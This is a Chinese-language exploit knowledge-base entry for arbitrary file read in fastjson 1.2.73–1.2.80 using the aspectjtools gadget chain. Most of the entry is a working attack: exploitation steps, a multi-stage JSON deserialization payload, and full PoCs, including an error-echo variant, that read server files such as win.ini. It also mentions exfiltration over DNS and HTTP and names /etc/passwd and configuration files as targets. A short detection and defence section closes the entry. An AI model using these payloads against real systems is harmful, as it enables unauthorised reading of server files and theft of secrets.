---
id: web-java-deser-fastjson-1280-aspectjtools-file-read
title: Fastjson 1.2.73-1.2.80 aspectjtools 任意文件读取：SourceTypeCollisionException 预热 + BasicCompilationUnit fileName 回显
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson-aspectjtools-basiccompilationunit-file-read
tags:
- java
- fastjson
- deserialization
- file-read
- aspectjtools
- autotype
- rce
cve: []
severity: high
confidence: medium
affected_versions: fastjson 1.2.73 <= version <= 1.2.80（原文标注；需目标 classpath 含 aspectjtools）
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V583
  verified_at: '2026-11-12T12:42:24+08:00'
  notes: 已对照原文核对：原文4.1明确fastjson 1.2.73<=version<=1.2.80；图42本地截图确认BasicCompilationUnit fileName读c:/windows/win.ini成功回显[fonts]；PoC/类名/字段与原文一致；dedup候选为Exception缓存绕过等不同gadget，非同链；affected_versions保留原文标注。
url: /docs/web/java/deserialization/fastjson/web-java-deser-fastjson-1280-aspectjtools-file-read/
draft: false
kb_aliases:
- fastjson 读文件
- aspectjtools 文件读取
- BasicCompilationUnit fileName
- SourceTypeCollisionException
- fastjson 1.2.80 任意文件读
- fastjson win.ini
---

## 一句话结论

在 fastjson 1.2.73~1.2.80 且 classpath 存在 aspectjtools 时，利用 `java.lang.Exception` 期望类 + `SourceTypeCollisionException` 的 `newAnnotationProcessorUnits` 字段预热 `ICompilationUnit` 的反序列化器缓存，再实例化 aspectj 的 `BasicCompilationUnit` 并指定 `fileName`，即可让 fastjson 读取服务器任意文件，并通过响应回显、`Character` 强制转换报错、DNS 或 HTTP 外带把内容带出。

## 原理

- fastjson 1.2.80 的 `checkAutoType` 在黑白名单判断前会先查反序列化器缓存；`ThrowableDeserializer` 把 `java.lang.Exception` 作为期望类后，会对剩余字段按声明类型 `TypeUtils.cast`，并把「字段类型 → 反序列化器」写入缓存。
- `org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException` 是 `Exception` 子类，且继承链上带有 `newAnnotationProcessorUnits` 等字段；第一段请求用双 `@type`（`java.lang.Exception` + `SourceTypeCollisionException`）把该异常类及其字段类型（如 `ICompilationUnit`）放进缓存。
- 后续请求再用 `java.lang.Class` + 嵌套 `JSONObject`/`Locale`/`String` 的技巧把目标类名写入 `TypeUtils` 类缓存，随后就可以直接以 `@type` 实例化 `org.aspectj...core.BasicCompilationUnit`，并给 `fileName` 赋值。
- `BasicCompilationUnit` 在构造/`getContents` 等路径上会读取 `fileName` 指向的文件；fastjson 填充字段/调用 getter 时把文件内容带入对象，再通过 `Message`/异常回显或 `Inet4Address`（DNS）、OGNL+commons-io（HTTP）等通道外带。
- 直读回显的最小验证：把 `BasicCompilationUnit` 作为某个字段值，fastjson 在序列化/`toString`/报错时把 `contents`（文件内容）输出；即使后续类型转换失败，读取已经发生。

## 触发条件

- fastjson 1.2.73 <= version <= 1.2.80（原文范围；不同版本步骤/字段名略有差异）。
- SafeMode 关闭，用户可控 JSON 进入 `JSON.parse`/`parseObject`。
- 目标 classpath 存在 aspectjtools（`org.aspectj.org.eclipse.jdt...`，常见于使用 AspectJ 编译/织入的 Spring 项目）。
- 目标进程对目标文件有读权限；回显需要响应含解析结果/报错，外带需要 DNS/HTTP 可达。
- 原文未给出 aspectjtools 具体版本影响区间。

## 利用步骤

1. 探测版本与依赖：用 `{"@type":"java.lang.Character"{"@type":"java.lang.Class","val":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit"}}` 之类报错/响应判断 aspectjtools 是否存在。
2. 第一段：用 `java.lang.Exception` 期望类 + `SourceTypeCollisionException` 预热（原文允许“分三次打”，中间报错可忽略）：
   ```json
   {"@type":"java.lang.Exception","@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"}
   ```
3. 第二段：类缓存/反序列化器缓存预置（原文的组合 payload，利用 `java.lang.Class` 的 `val` 由嵌套 `JSONObject`/`Locale` 构造）：
   ```json
   {"@type":"java.lang.Class","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{ "@type":"java.lang.String""@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException","newAnnotationProcessorUnits":[{}]}}}
   ```
4. 第三段：读取目标文件并回显：
   ```json
   {"username":{"@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit","@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit","fileName":"c:/windows/win.ini"},"password":"admin"}
   ```
   响应中的 `contents` 即文件内容（原文截图读取 `c:/windows/win.ini`）。
5. 无直接回显时换外带通道：把第三步的 `BasicCompilationUnit` 换成 `java.lang.Character` 包装触发报错回显；或换成 `java.net.Inet4Address`（DNS，Mac 环境）；或接 OGNL+commons-io 的 `BOMInputStream`/`URLReader`（HTTP 外带，见关联文件写卡）。

## PoC

```json
[{"@type":"java.lang.Exception","@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"},{"@type":"java.lang.Class","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException","newAnnotationProcessorUnits":[{}]}}},{"username":{"@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit","@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit","fileName":"c:/windows/win.ini"},"password":"admin"}]
```

```json
// 报错回显变体
[{"@type":"java.lang.Exception","@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException"},{"@type":"java.lang.Class","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException","newAnnotationProcessorUnits":[{}]}}},{"username":{"@type":"java.lang.Character"{"c":{"@type":"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit","@type":"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit","fileName":"c:/windows/win.ini"}},"password":"admin"}]
```

## 变体与关联

- 变体：`BasicCompilationUnit` 的父路径可用 `fileName` 指向任意可读文件（配置、源码、`/etc/passwd`、Windows `win.ini` 等）。
- 变体：aspectjtools + xalan（>=2.4.0）+ dom4j 的组合可把读取内容放入 `XNodeSetForDOM`/`XMLWriter` 再经 commons-io 外带（分五次打，中间报错可忽略）。
- 关联：[[web-java-deser-fastjson-1268-autocloseable-expectclass-file-rw]]（1.2.68 的 BOMInputStream getBom 读取链）、[[web-java-deser-fastjson-1280-exception-deserializer-cache-bypass]]（1.2.80 Exception 期望类缓存绕过原理）、[[web-java-deser-fastjson-1280-ognl-xalan-commonsio-file-write]]（同版本段的文件写入链）、[[web-java-deser-fastjson-file-write-to-rce]]（读/写后的 RCE 落地点）。
- 边界：fastjson 不在 1.2.73~1.2.80、SafeMode 开启、classpath 无 aspectjtools、文件不可读、无任何回显/外带通道时失效。

## 检测与防御

- 检测：JSON 中出现 `org.aspectj.org.eclipse.jdt`、`BasicCompilationUnit`、`SourceTypeCollisionException`、`newAnnotationProcessorUnits`、`ICompilationUnit` 等类名；`java.lang.Exception`/`java.lang.Class` 双 `@type` 结构；响应中出现文件内容片段（如 `[fonts]`、`root:x:`）。
- 防御：升级 fastjson 并开启 SafeMode，禁用 AutoType；对反序列化入口做 `@type` 白名单；移除不必要的 aspectjtools 依赖；限制应用读取敏感文件；配置 `jdk.serialFilter` 与出网限制。
